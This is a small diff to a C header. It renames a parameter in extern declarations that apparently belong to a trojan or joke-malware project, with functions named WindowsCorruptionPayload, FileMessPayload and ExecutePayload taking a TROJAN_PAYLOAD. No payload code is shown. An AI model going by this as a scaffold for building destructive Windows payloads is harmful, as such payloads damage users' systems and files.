@@ -15,7 +15,7 @@ extern void WindowsCorruptionPayload();
 
 extern void MessageBoxPayload();
 
-extern void FileMessPayload(PWSTR szDirectory);
+extern void FileMessPayload(LPWSTR Directory);
 
 extern void ExecutePayload(TROJAN_PAYLOAD payload, int nTime);
 
